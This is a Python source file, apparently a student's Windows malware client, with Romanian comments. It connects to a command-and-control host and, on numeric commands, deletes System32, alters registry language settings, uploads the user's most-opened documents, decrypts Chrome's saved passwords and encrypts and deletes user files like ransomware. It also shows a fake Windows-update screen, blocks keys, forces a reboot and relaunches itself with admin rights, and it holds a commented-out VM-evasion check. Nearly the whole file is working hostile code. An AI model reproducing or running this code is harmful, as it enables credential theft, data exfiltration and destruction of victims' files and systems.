import socket
import os
import random,string
import subprocess
import shutil
import ctypes
import urllib.request
import requests
import stat
from pathlib import Path
import winreg
import sys
import time
import logging
from watchdog.observers import Observer
from watchdog.events import FileSystemEvent, FileSystemEventHandler, LoggingEventHandler
import sqlite3
import win32crypt
import threading
import winshell
import pythoncom
import pyAesCrypt
import wmi
import json,base64
from Crypto.Cipher import AES
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtGui import QMovie
import keyboard
userhome = os.path.expanduser('~')



#########################################################################################3
def DeleteOs():
   
    
    #location="C:\\Windows\\"
    location="lala"
    dir="System32"
    path=os.path.join(location,dir)
    shutil.rmtree(path)
    

###########################################################################################


def ChangeBackground():
    
    
    s='C:\Windows\Web\Wallpaper\Theme1\img03.png'
    if(not os.path.isfile(s)):
        local_file=open('C:\\Windows\\Web\\Wallpaper\\Theme1\\img03.png','wb')
        image_url = "https://www.outdoorproject.com/sites/default/files/styles/cboxshow/public/blog-copies/dsc_0215c_1.jpg?itok=ql-eoNl3"
        resp = requests.get(image_url, stream=True)
        local_file.write(resp.content)
        local_file.close()
    ctypes.windll.user32.SystemParametersInfoW(20, 0, s , 0)

##############################################################################################


#### VEZI CA ARE NEVOIEE DE RESTART CA SA SE APLICA LIMBA ###### DACA II DAI DUPA AIA CU RESTART E OK !!!!!!!!!!!!!!!!!!!!!!!
def changeLanguage():
    with winreg.ConnectRegistry(None,winreg.HKEY_LOCAL_MACHINE) as hkey:
        with winreg.OpenKey(hkey,"SYSTEM",0,winreg.KEY_ALL_ACCESS) as sub_key:
             with winreg.OpenKey(sub_key,"CurrentControlSet",0,winreg.KEY_ALL_ACCESS) as sub_key1:
                 with winreg.OpenKey(sub_key1,"Control",0,winreg.KEY_ALL_ACCESS) as sub_key2:
                      with winreg.OpenKey(sub_key2,"MUI",0,winreg.KEY_ALL_ACCESS) as sub_key3:
                           with winreg.OpenKey(sub_key3,"UILanguages",0,winreg.KEY_ALL_ACCESS) as sub_key4:
                               for i in range (0,5):
                                   try:
                                      s=winreg.EnumKey(sub_key4,i)
                                      winreg.DeleteKey(sub_key4,s)
                                   except:
                                        break  
                            #    with winreg.CreateKey(sub_key4,"ro-Ro") as sub_key5:
                            #       winreg.SetValueEx(sub_key5,"LCID",0,winreg.REG_DWORD,1048)#418 rom
                            #       winreg.SetValueEx(sub_key5,"Type",0,winreg.REG_DWORD,273)#111
                               with winreg.CreateKey(sub_key4,"fr-Fr") as sub_key5:
                                  winreg.SetValueEx(sub_key5,"LCID",0,winreg.REG_DWORD,1036)#40C franta
                                  winreg.SetValueEx(sub_key5,"Type",0,winreg.REG_DWORD,273)#111
  


##################################################################################################


class Handler(FileSystemEventHandler):
    def on_any_event(self, event):
        pythoncom.CoInitialize()
        
        # print(path)
        
        global f
        sh2=winshell.shortcut(event.src_path)
        path=sh2.path
        name=os.path.basename(path)
        nm,ext=os.path.splitext(name)
        print(path)
        if ext =='.txt' or ext=='.doc' or ext=='.pdf':
            if path not in f:
              f[path]=1
            else:
             f[path]=f[path]+1

         
        
       
        #print("Ia uite path ul !!!!!!!!!!!")    
        #print(event.src_path)
        #pathul asta il pun ca si cheie intr un dictionar si cresc nr de aparitii




class thread(threading.Thread):   
    def __init__(self, thread_name, thread_ID,client):
        threading.Thread.__init__(self)
        self.thread_name = thread_name
        self.thread_ID = thread_ID
        self.client=client
    def send_file(self,fname):
        print ("CLIENT-INTRA PE SEND")
        size=os.path.getsize(fname)
        # client.send(fname)   
        # client.send(size.encode())
        client.send(f"{fname}<Separator>{size}".encode())
        with open(fname,"rb") as f:
            while True:
                br=f.read(4096)
                if not br:
                    break
                client.sendall(br)
        
        client.send(f"gata".encode())
        print ("CLIENT-GATA CU  SEND")


    def run(self):
     
      
     global f
     f=dict() 
     #path=r'C:\Users\spiri\AppData\Roaming\Microsoft\Windows\Recent' 
     path=os.path.expanduser('~'+r'\AppData\Roaming\Microsoft\Windows\Recent')
     event_handler = Handler()
     observer = Observer()
     
     observer.schedule(event_handler, path, recursive=True)
     observer.start()
     try:
          print("sleep")
          time.sleep(50) # 60 * 60 =>3600 =1h cat sa stea threadul asta pe sleep ca observerul sa si faca treaba 

          #aici as vrea sa ma plimb prin dictionaru de la obserrver si sa vad ultimele 3 pe alea le trimit la c2c daca exsitaaa a
          if len(f)>0:
              print("IA TE UITE CHEILEE in ordineee!")
              nr=0
              for i in reversed(sorted(f.items(), key=lambda el:el[1])):
                  print (i)
                  if nr>3:
                      break
                  nr=nr+1
                  name=i[0]
                  print("hai ca ma enerveziziiiiiiiiiiiiiiiiiii")
                  print(name)
                  self.send_file(name)
           #acuma cum le trimit la c2c ??? ah nasoala treaba
                  




     finally:
         observer.stop()
         observer.join()

#################################################################################################################

def get_chrome():
    path=os.path.expanduser('~'+r'\AppData\Local\Google\Chrome\User Data\Default\Login Data')
    c=sqlite3.connect(path)
    cursor=c.cursor()
    stm='Select origin_url, username_value, password_value FROM logins'
    cursor.execute(stm)
    data=cursor.fetchall()
    cred={}
    string=''
    for url, user_name, pwd in data:
        pwd=win32crypt.CryptUnprotectData(pwd)
        cred[url]=(user_name,pwd[1].decode('utf8'))
        print(url)
        print(user_name)
        print(pwd[1].decode('utf8'))
        print("............................")

###################################################################################################################

def get_master_key():
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
         local_state = f.read()
         local_state = json.loads(local_state)
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]  # removing DPAPI
     master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
     return master_key

def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
     try:
         iv = buff[3:15]
         payload = buff[15:]
         cipher = generate_cipher(master_key, iv)
         decrypted_pass = decrypt_payload(cipher, payload)
         decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
         return decrypted_pass
     except Exception as e:
         # print("Probably saved password from Chrome version older than v80\n")
         # print(str(e))
         return "Chrome < 80"
 
def get_chrome1():

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect("Loginvault.db") 
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if len(username) > 0:
                print("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass
    

####################################################################################################################
class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
       
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(3000, 1000)
        MainWindow.setWindowFlags(QtCore.Qt.FramelessWindowHint)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        
        # create label
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(0, 0,1800, 1000))
        self.label.setMinimumSize(QtCore.QSize(0, 1000))
        self.label.setMaximumSize(QtCore.QSize(3000, 1000))
        self.label.setObjectName("label")

        # add label to main window
        MainWindow.setCentralWidget(self.centralwidget)
        gf=os.path.expanduser('~')+r'\Downloads\fain1.gif'
        if(not os.path.isfile(gf)):
          print("ok ok ok ")
          
          uri='https://www.fcnaustin.com/wp-content/uploads/2019/04/WindowsUpdateMissileAlert.gif'
          with open(gf,'wb') as f:
             f.write(requests.get(uri).content)
          
        print("direct aiceaaa")  
        # set qmovie as label
        self.movie = QMovie(gf)
        self.label.setMovie(self.movie)
        self.movie.setScaledSize(self.label.size())
        self.movie.start()
        keyboard.block_key('Alt')
        os.system('shutdown/r')



def restart():
    app = QtWidgets.QApplication(sys.argv)
    window = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(window)
    window.show()
    sys.exit(app.exec_())

#############################################################################################################


### !!!!! <3 <3 <3 <3 <3 DE ADUS FUNCTIA DE RESTART DE PE TEST.PY SI CORECTAT PE ACOLO , ORI BLOCAT TASTATURA ORI SCHIMBAT MESAJUL  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! 

def interes(ext):
    if ext=='.txt' or ext=='.pdf' or ext=='.doc' or ext=='.jpg' or ext==".png":
        return True
  
    return False


def get_files(root_d):
    for root,dir,files in os.walk(root_d):
        for basename in files:
            if interes(os.path.splitext(basename)[1]):
                fn=os.path.join(root,basename)
                yield fn

def generator(size=6, chars=string.ascii_letters+string.digits):
    return ''.join((random.choice(chars)  for _ in range(size)  ))+'.'+'aes'

def cripteaza(key,name,new_name):
    bufferSize = 64 * 1024
    with open(name,"rb") as fIn:
        with open(new_name,"wb") as fOut:
            pyAesCrypt.encryptStream(fIn,fOut,key,bufferSize)
def delete(name):
    os.remove(name)
def gen(path, name):
    key = ''.join([ random.choice(string.ascii_letters + string.digits) for n in range(32) ])

    ### ar trebui pastrata cheia asta pt decriptare

    ## poate undeva ceva gen dictionar-> la path ul complet al unui fisier sa am cheia sau trimis la server si retinuta pe acoloo
    new_name=path+'\\'+generator(36)
    try:
        cripteaza(key,name,new_name)
    except:
        pass    

def ransomware():
    #listd=(userhome+'\\Downloads\\',userhome+'\\Documents\\' , 'D:\\','E:\\')
    # sa sterf ceva ce nu mi trebuie totusi
    listd=('C:\\Users\\spiri\\Downloads\\Ransomware','C:\\Users\\spiri\\Downloads\\Ransomware1')
    for d in listd:
        for f in get_files(d):
            gen(d,f)
            delete(f)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
    
    
    
ok=1    
# f=wmi.WMI()
# for process in f.Win32_Process():
#     if  "vm" in process.Name.lower():
#         ok=0
#         break 

if ok==1 and is_admin():
    
    target_host = "192.168.190.128"
    target_port = 99

    client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    client.connect((target_host,target_port))

    #adaugam la startup
    


    while True:
        data = client.recv(1024)

        if len(data) > 0:
            if data.decode('UTF-8')=='1':
                print('1')
                DeleteOs()
            elif data.decode('UTF-8')=='2':
                print('2')
                ChangeBackground()
            elif data.decode('UTF-8')=='3':
                print('3')
                changeLanguage()
            elif data.decode('UTF-8')=='4':
                print('4') # aici se si trimite deci 
                watch_dog=thread("watch_dog",1000,client)
                watch_dog.start()
            ##threaul asta cum il asteptam ??? el ar trebui sa se termine el asa dar acuma nahh trebuie vazut
            elif data.decode('UTF-8')=='5':
                print('5')
                get_chrome1()
            elif data.decode('UTF-8')=='6':   
                print('6')
                restart()
            elif data.decode('UTF-8')=='7': 
                print('7')
                ransomware() 
            elif data.decode('UTF-8')=='quit':
                break                
            # cmd = subprocess.Popen(data[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE )
            # output_bytes = cmd.stdout.read()
            # output_str = str(output_bytes, "utf-8")
            # client.send(str.encode(output_str + str(os.getcwd()) + '$'))
            print(data)

    client.close()
elif not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)


